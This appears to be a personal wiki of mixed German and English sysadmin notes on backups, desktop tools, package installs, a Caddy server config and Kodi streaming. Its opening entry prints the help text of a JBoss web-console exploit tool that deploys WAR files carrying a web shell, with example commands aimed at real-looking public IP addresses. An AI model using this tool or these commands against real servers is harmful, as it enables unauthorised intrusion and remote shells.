My Wiki
- - - - - - 
* Notes to myself, all writen in clear MarkDown ;)

----------------------------


## command
### Argument example
 * **Command with arguments**: `command --help`
 * **Description**: Displays files recursively~
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **OS:** Show/Hide</div><div class="view"><code>
   
                % jruby ./webconsole_invoker.rb -h 2>/dev/null
                Usage: ./webconsole_invoker.rb [options] MBean
                
                    -u, --url URL                    The Invoker URL to use (default: http://85.115.22.239:8180/web-console/Invoker)
                    -w, --war WAR                    Local WAR file for deploy (default: jenkins.war)
                    -b, --bsh BSH                    Execute this BSH script as payload  (default: payload/jenkins.bsh)
                    -t, --test                       Test the script with the ServerInfo MBean's listThreadDump() method
                    -m, --main-deployer URL          HTTP-URL to your Shell.war or whatever
                    -d, --deployment-file            Create Basic shell on 
                    -c, --create-script-deployment   Execute own BSHScript to deploy browser.war
                    -h, --help                       Show this help
                
                Example usage:
                ./webconsole_invoker.rb [-w axis.war] -d test -u http://125.227.174.234:80/web-console/Invoker
                        -create a named axis.war per deployment-file func. with a basic shell (axis/test.jsp)
                
                ./webconsole_invoker.rb -c --url http://victim/web-console/Invoker
                ./webconsole_invoker.rb -m http://remote/shell.war --url http://85.115.22.239:8180/web-console/Invoker
   
     </code></div>



div-command notes
------------------------------
* nach Markdown convertierte liste von commandlinefu commands


  * [div-notes](commands.md)



# BackUp - Notes & Tips
- - - - - - - - - - - - - - - 

Disaster recovery easy with rear
------------------------------
* on Debian based system ( also Ubutnu etc) use this dpkg package: [rear_1.17.2_all.deb](/rear_1.17.2_all.deb)
* Out-of the box muss nur eingestellt werden, was für recovery image ihr erstelen wollt.
* Bsp 1: `$ OUTPUT=USB && BACKUP_URL=usb:///dev/disk/by-label/REAR-000` ersellt ein bootfähiges USB medium mit allen benötigen daten zum wiederherstellen
* Note: Vorher muss das USB msedium per `$ rear format /dev/sdX` komplett platt gemacht werden, danach können die Partitionen ja geresized werden 



#Desktop Notes & Tips
====================

KDE Klipper scripts - Url2MarkDown
-----------------
* format a http link to Markdown format: `klipper-markdown-link`
* Regex: `^http.?://.*`

[gimmick:gist](b6181b5c4ee86bcd434ba0255211526e)




Install Conky-Manager
---------------------
* ![Desktop](http://storage2.static.itmages.com/i/16/0828/h_1472385934_3730740_62ae560e3f.png)

* FOr Thems Package, look at : [teejeetech.in](http://www.teejeetech.in/p/conky-manager.html)

            $ sudo add-apt-repository ppa:teejee2008/ppa     
            $ apt-get update && apt-get install conky-manager
            
            
Conky Themen Packs
--------------------      
          

| Name                       	| DL 	| INFO 	|
|----------------------------	|----	|------	|
| dbiesecke Themes              	|[dbiesecke.cmtp.7z](http://dbiesecke.github.io/dbiesecke.cmtp.7z)    				| My Conky workspace |
| Conky default Themes              |[default-themes-extra-1.cmtp.7z](https://github.com/dbiesecke/dbiesecke.github.io/blob/master/default-themes-extra-1.cmtp.7z?raw=true)    				| Conky Theme Package |






# Install Tips & Tricks
- - - - - - 

Ubuntu 16 LTS Source.list (dev)
-----------------------------------


            curl https://repogen.simplylinux.ch/txt/xenial/sources_2ab893bff6e80d03a4e97f2516b4c5d448bfd6b3.txt | sudo tee /etc/apt/sources.list`
            #gpg keys
            curl https://repogen.simplylinux.ch/txt/xenial/gpg_2ab893bff6e80d03a4e97f2516b4c5d448bfd6b3.txt | sudo tee /etc/apt/gpg_keys.txt





Create (free) Log Infra.
------------------------------
* Baed on [papertrails](https://papertrailapp.com) & [logentries](https://logentries.com)

* Install Snoopy to log all cmd/tty commands


            rm -f snoopy-install.sh &&
            wget -q -O snoopy-install.sh https://github.com/a2o/snoopy/raw/install/doc/install/bin/snoopy-install.sh &&
            chmod 755 snoopy-install.sh &&
            ./snoopy-install.sh stable
            # avoid log spawm
            echp 'filter_chain = "only_tty"' >> /etc/snoopy.ini


* Now we add rsyslog rules: `/etc/rsyslog.conf` 


            $template Logentries,"df57b035--ad90-cf6b7342ba24 %HOSTNAME% %syslogtag%%msg%\n"
            *.*;cron.none             @@data.logentries.com:80;Logentries
            
            *.*;cron.none             @logs2.papertrailapp.com:107754






Debian GRML scripts
-------------------------

            wget -qO- http://deb.grml.org/repo-key.asc | sudo apt-key add --    
            sudo echo   'deb     http://deb.grml.org/ grml-testing main' > /etc/apt/sources.list.d/grml.list
            sudo apt-get update 
            
Install some usefull tools
-----------------------------

            sudo apt-get install grml-tips grml-crypt grml-network grml-paste grml-shlib grml-tips grml-quickconfig
            grml-scripts


            

Install Android SDK
-----------------------------

            wget http://linuxundich.de/static/android_sdk_installer.sh
            chmod +x android_sdk_installer.sh
            sudo ./android_sdk_installer.sh


Install ZSH
------------------

            $ wget -qO- .zshrc http://git.grml.org/f/grml-etc-core/etc/zsh/zshrc

Monodevelop Latest
----------------------

            sudo add-apt-repository ppa:keks9n/monodevelop-latest
            
Scribes
--------------------

         sudo add-apt-repository ppa:mystilleef/scribes-daily
            
            
Google Chrome            
-----------------

            wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
            sudo sh -c 'echo "deb http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list'
   

Install webupd8 repo
-------------------------   
        
            sudo add-apt-repository ppa:nilarimogard/webupd8
            
Install Every ( cron-tool )            
-------------------------------
        
        wget https://raw.githubusercontent.com/iarna/App-Every/master/packed/every && chmod +x every && mv every /usr/local/bin 

               
Linux - i386 support for x86_64
=========================================

RPM based
* `# yum -y install glibc-devel.i386 libstdc++-devel.i386`
* `# yum -y install glibc-devel.i686 glibc-devel ibstdc++-devel.i686`
* `# zypper in glibc-devel-32bit`

debian
* `$ sudo apt-get install g++-multilib libc6-dev-i386`


Example

`$ gcc -m32 -o output32 hello.c`




Install Ajenti Webpanel
================================

`wget -O- https://raw.github.com/Eugeny/ajenti/master/scripts/install-ubuntu.sh | sudo sh`


Install Docker ( Ubuntu )
================================
* its recommend to install kernel-extras
 

`$ sudo apt-get install linux-image-extra-$(uname -r)`
`$ curl -sSL https://get.docker.io/ubuntu/ | sudo sh`


* Install docker-composer ( fig replacement)


            $ curl -L https://github.com/docker/compose/releases/download/1.5.2/docker-compose-`uname -s`-`uname -m` > /usr/local/bin/docker-compose



Install x64 caddy ( http server)
---------------------------------

    curl -skL 'https://caddyserver.com/download/build?os=linux&arch=amd64&features=' | tar xvzf -   && rm README.txt LICENSES.txt CHANGES.txt
    sudo mv caddy /usr/local/bin/ && sudo ln /usr/local/bin/caddy /usr/bin/caddy
    sudo apt-get install php5-fpm libfcgi-perl wget curl -y -f 
    
    #install perl fcgi
    wget http://nginxlibrary.com/downloads/perl-fcgi/fastcgi-wrapper -O /usr/bin/fastcgi-wrapper.pl
    wget http://nginxlibrary.com/downloads/perl-fcgi/perl-fcgi -O /etc/init.d/perl-fcgi
    chmod +x /usr/bin/fastcgi-wrapper.pl
    chmod +x /etc/init.d/perl-fcgi
    update-rc.d perl-fcgi defaults
    insserv perl-fcgi || systemctl daemon-reload 
    /etc/init.d/perl-fcgi start
    
    sudo cat > /etc/caddy.conf << EOF
        0.0.0.0:8443 {
            root /var/wwww
            log /var/log/http-caddy.log
            errors /var/log/error.log
            basicauth / root haxxor
            gzip
            #templates / .html
            
            fastcgi /bin/ 127.0.0.1:8999  {
             ext   .pl .psgi
             split .pl
            }
            
            # PHP-FPM with Unix socket
            fastcgi / /var/run/php5-fpm.sock php
            
            #Example Reverse Proxy call
            proxy /api/ http://127.0.0.1:3388/api/ {
             without /api
             proxy_header Host {host}
            }
            
            #Example FileSearch
            #search /search {
            # -path dbiesecke
            #        -path .git
            #        -generated_site
            #        +path shells
            # +path logs
            # +path log
            # template inc/search.tpl
            #}
            
            #Example rewrite
            #rewrite /shells/ {
            #    regexp (.*)\.json
            #    to  /bin/shodan.pl?uri={uri}
            #}
        }
    EOF
   
   
   



Re-encode with UMS
------------------------
* **Der wohl beste UPnP Transcoding Server: [UMS](http://www.universalmediaserver.com/) **
* ** Beseitigt effektiv das Problem das die Streams regelmäßig abbrechen & stottern - dafür längere Umschaltzeiten! (~2-5sek)**

![](http://i.imgur.com/lSqloL7.png)

* Transcoded effectiv die streams neu & stellt sich als UPnP server zur verfügung.
* Dies erlaubt den Zugriff auf IPTV & Co auch über PS3,XBOX & co!


1. Download & Entpacken von [UMS](http://www.universalmediaserver.com/)

2. Playlisten aus diesem Repo runterladen & entpacken 
  * Diesr Ordner ist dann in UMS in den "Haupteinstellung --> Navigations/Freigabe" einstellung einzutragen
  * ![](http://i.imgur.com/X07IL5L.png)
  
3. Dann können die Playlisten auch schon in Kodi & Co aufgerufen werden!
  * Unter Linux empfehle ich [djmount](https://github.com/Boxee/djmount) um alle UPnP ins dateisystem zu mounten 
  
4. **Falls der UPnP nicht in Kodi erscheint, bitte die IP addresse in UMS einstellen/Manuell festlegen**
5. **Falls es beim abspielen Probleme gibt, prüft die Transcoding einstellungen & wechselt zwischen FFmpeg/vlc/mencoder etc. **

* Optional ist es nun möglich auch am Handy über HTML5/Flash die Streams zu schauen, dazu erstellt [UMS](http://www.universalmediaserver.com/) automatisch einen Webserver den ihr unter [127.0.0.1:9001/](http://127.0.0.1:9001) ereicht
  * ![](http://i.imgur.com/9fMOECb.png)



Lets Encrypt rockt!
------------------------------------- 

Als ich einen neuen webserver/reverse-proxy brauchte bin ich auf [caddy](https://caddyserver.com/download) gestoßen.
Allein die die features wie Git,Markdown & search plugins machen ihn ja schon zu na wucht. Aber seit kurzem unterstützt 
er auch ne lets-encrypt integration. Das heißt für euch OHNE config

| Tools/Libs                    | Lang | DL                                              | My-opinion                                                |
|-------------------------------|------|-------------------------------------------------|-----------------------------------------------------------|
| Caddy - HTTP Server           | GO   | [LINK](https://caddyserver.com/download)        | fast Webserver and will auto-generate a SSL cert for you! |
| LEGO - Go Lets Encrypt Client | GO   | [LINK](https://github.com/xenolf/lego/releases) | Easy to use Client to generate Certs                      |
|                               |      |                                                 |                                                           |




continuous integrations über wercker
----------------------------------------

[![wercker status](https://app.wercker.com/status/0e32abc3e5a861cc6d825b12817d7f4a/m "wercker status")](https://app.wercker.com/project/bykey/0e32abc3e5a861cc6d825b12817d7f4a)

![Wercker](http://i.imgur.com/wqCK5eW.jpg) 


[Wercker](https://wercker.com/) ist ein sehr flexibles aber auch einfach zu implementierendes  "continuous integrations system". Aktuell erstellt es von meinem meiner Perl Packete ein Docker Container & transferiert ihn über scp auf meinen Server.


![Wercker](http://i.imgur.com/rnGI1Ki.jpg)




Aptly CheatSheet verlinkt
----------------------------------
Meine kurz anleitung für [aptly](/#!https://gist.githubusercontent.com/dbiesecke/5ecd3d5d2de50bcd30aa/raw/README.md) habe ich hinzugefügt.
Dies macht es einem einfach sein eignes deb Repository zu pflegen. 



Gist notes hinzugefügt
----------------------------------
Ich habe kleines script geschrieben um weitere Notes aus Gist zu importieren.
Den src findet ihr hier: [my-gist-info.pl](http://dbiesecke.github.io/tools/my-gist-info.pl)


Added patch to hurik/MangaDownloader
----------------------------------
* Added top DE sites to [hurik/MangaDownloader](https://github.com/hurik/MangaDownloader)

![](http://i.imgur.com/ovu8bwA.jpg) 


Kodi
----------------------------------
* Config für [IPTV Simple PVR](/#!repo/pvr.iptvsimple/README.md) mit aktuellen EPG hinzugefügt
* [IPTVExtra](/#!my/kodi/iptvextra.md) als alternative zu Simple PVR ( mehrer Sprachen etc)


[![](/repo/repository.iptvxtra/icon.png)](/#!my/kodi/iptvextra.md)
[![](/repo/pvr.iptvsimple/icon.png)](/#!repo/pvr.iptvsimple/README.md)
[![](/repo/repository.xstream/icon.png)](/repo/repository.xstream/repository.xstream-1.0.5.zip)
[![](/repo/repository.addonscriptorde-beta/icon.png)](/repo/repository.addonscriptorde-beta/repository.addonscriptorde-beta-1.0.1.zip) 



Java2Binary on *nix
----------------------------------
Ich schweif heute mal bischen von meinen Üblichen Themen ab, aber das auch nur weil ich auf 2x Intressante Projecte gestoßen bin.
Ich hatte als ziel nen Java Source (drFTPD) in ne portable binary zu gießen, was je nach ran gehnsweise ganz gut funktioniert.

Vorweg: Es würde den projecten nicht gerecht wenn man die "frameworks/tools" nur für´s reihne builden verwendet, vorallem IKVM 
baut eine solide Mono Grundlage für weitere entwicklungen, wobei robovm mono unabhängige binarys baut.

[ikvm](http://www.ikvm.net/) und [robovm](http://www.robovm.org/)


